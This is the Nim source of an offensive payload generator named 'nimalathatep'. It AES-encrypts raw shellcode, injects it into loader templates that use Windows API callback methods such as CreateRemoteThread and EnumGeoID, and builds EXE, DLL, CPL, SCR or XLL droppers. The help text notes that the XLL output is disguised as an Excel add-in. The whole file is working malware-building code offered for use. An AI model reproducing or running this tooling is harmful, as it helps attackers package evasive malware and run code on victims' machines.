import winim/lean
import os
import base64
import nimcrypto
import strutils
import random
import std/json


let banner = """
 ______ __  __  ____      ___ ____   ___  __    __ __    __ __  __   ___       ___ __  __  ___    ___    __ 
 | || | ||  || ||        //   || \\ // \\ ||    || ||    || ||\ ||  // \\     //   ||  || // \\  // \\  (( \
   ||   ||==|| ||==     ((    ||_// ||=|| \\ /\ // ||    || ||\\|| (( ___    ((    ||==|| ||=|| ((   ))  \\ 
   ||   ||  || ||___     \\__ || \\ || ||  \V/\V/  ||__| || || \||  \\_||     \\__ ||  || || ||  \\_//  \_))
                                                                                                            
        
                                                                ,* .,  ,., .                        
                                                           .**((((.        ,(%(//,                  
                                                           ,((((,     */      ,(((/.. .             
               ,/((((*      *(((/,,                         .*/*,              ,**,.                
           ..*(/#(              /(#(*,                          ./,.         ....                   
            .,/*/,              ,((/*,.                                                             
              .(//             .*,..                                                                
                    ..     ..                                                                       
                                                                                                    
                                                                                                    
                                      ,#(((////*//((*,.                       *(#(/*/,**/(/(*,.     
,* .*  **,,,,.                     *//#((/.          /##/(/.               ,*/#(##/         ./#(/(*.
#/.        ,##((*,*              .,/(##(               .(###*,            .*(#(((               /#((
              /###*,,             ..*/**       .        ,/*/*,.             ./*//                ,//
              ,((***,.               *//*               ,/,..                 ,*//,              *.,
             .,***.                      .,*.       ....                           ,,,        ,,... 
           .....                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                      .*.  ,   .. ,,.               
     ./#(#((((/,*/(/((/*,.                                        .*((((##/.      ,(#///,           
  ,*//#/((/           ,(#(///*,                                ..//(/(**             ./#((//*.      
 ,*((#((.                (####/..                              .,/(((#*                 *#((((,,    
 ,*//(/.      .          ,(/(***..                               ,*//(*                  */(*(*,,.  
  ,//,*.                 .***/** .                                .*//*,                 ,**/* .    
   .(//*                 ..,,.                                       ,///               .,...       
      .,,*.          ...,..                                               ,,,.       ., .           
               .                                                                                    
                                                                                                    
  
             ...quivering and afraid, into the sightless vortex of the unimaginable.

         
"""
echo "\n"
echo banner
let helpmenu = """
Usage: nimalathatep.exe [-h/h/help] <apiMethod> <binFile> <outfiletype>

Methods currently available:
EnumGeoID [enumgeoid]
CreateFiber [createfiber]
CreateRemoteThread [createremotethread]
CreateThreadpoolWait [createhreadpoolwait]
EnumLanguageGroupLocales [enumlanguage]
CryptEnumOIDInfo [cryptenum]
EnumDisplayMonitors [enumdisplay]
CertEnumSystemStore [enumsystemstore]
EnumDesktopWindows [enumdesktop]
EnumTimeFormatsEx [enumtime]
EnumCalendarInfoW [enumcalendar]

File types currently available:
EXE - bread and butter
DLL - use rundll32.exe and give it any function after (ex: rundll32.exe evil.dll foobar123) 
CPL - Control Panel Applet, can just be clicked or run with control.exe or rundll32.exe
SCR - can be run just by clicking, or executing the file in a shell
XLL - disguised as an Excel dock, sideloads payload
"""

let argc = paramCount()
let argv = commandLineParams()

proc printHelp(fail :bool) =
    echo helpmenu
    if fail:
        quit 1
    else:
        quit 0

proc prePayloadGen(file_path: string, encodedCrypted: string, newpassword: string) =
    var file_target = file_path.readFile()
    let placeholder = "REPLACE_ME"
    let replacement =  encodedCrypted
    file_target = file_target.replace(placeholder, replacement)
    file_path.writeFile(file_target)         
    let pass_new = newpassword
    let replace_pass_new = "PASSWORD_ME"
    file_target = file_target.replace(replace_pass_new, pass_new)
    file_path.writeFile(file_target)

proc postPayloadGen(file_path: string, encodedCrypted: string, newpassword: string) =
    var file_target = file_path.readFile()
    let placeholder_new = encodedCrypted
    let replacement_new = "REPLACE_ME"
    file_target = file_target.replace(placeholder_new, replacement_new)
    file_path.writeFile(file_target)
            #you too password!
    let password_revert = newpassword
    let original_pass = "PASSWORD_ME"
    file_target = file_target.replace(password_revert, original_pass)
    file_path.writeFile(file_target)


proc rndStr: string =
    for _ in .. 42:
        add(result, char(rand(int('A') .. int('z'))))


proc main() = 

    if argc == 0:
        echo "No args provided.\nSee usage below:\n"
        printHelp(true)
    elif argc != 3:
        echo "No args provided"
        printHelp(true)

    case argv[0]:
        of "h":
            printHelp(false)
        of "help":
            printHelp(false)
        of "-h":
            printHelp(false)

    let #get args
        apiMethod: string = argv[0]
        binFile: string = argv[1]
        fileType: string = argv[2]

    #read the file
    var file: File
    file = open(binFile, fmRead)
    var fileSize = file.getFileSize()
    var plaintext = newSeq[byte] (fileSize)
    discard file.readBytes(plaintext, 0, fileSize) #ignore the return value
    var
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        encrypted: seq[byte] = newSeq[byte](len(plaintext))
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149] #static still for new 
    randomize()
    var newpassword: string = rndStr()
    var expandedKey = sha256.digest(newpassword)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

        
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encrypted)
    ectx.clear()
        
    # Base64 encode encrypted shellcode
    let encodedCrypted = encode(encrypted)
    var payloadFile = readFile("payloads.json")
    var payloadData = parseJson(payloadFile)

    echo "Encrypting and encoding payload. May your efforts be fruitful.\n\n"

    var file_path = ""
    
    if fileType == "xll":
        file_path = payloadData["methods"][apiMethod]["filepaths"]["xll"].getStr()
        if file_path != "":
            prePayloadGen(file_path, encodedCrypted, newpassword)
            if payloadData["methods"][apiMethod][fileType]["payload"].getStr() != "":
                discard execShellCmd(payloadData["methods"][apiMethod][fileType]["payload"].getStr())
                discard execShellCmd(payloadData["methods"][apiMethod][fileType]["cleanup"].getStr())
            else:
                echo "Error with the payload, could be that the payload type does not support that method\n\n"
                printHelp(true)
    else:
        file_path = payloadData["methods"][apiMethod]["filepaths"]["standard"].getStr()
        if file_path != "":
            prePayloadGen(file_path, encodedCrypted, newpassword)
            if payloadData["methods"][apiMethod]["standard"][fileType].getStr() != "":
                discard execShellCmd(payloadData["methods"][apiMethod]["standard"][fileType].getStr())
            else:
                echo "Error with the payload, could be that the payload type does not support that method\n\n"
                printHelp(true)
    postPayloadGen(file_path, encodedCrypted, newpassword)
main()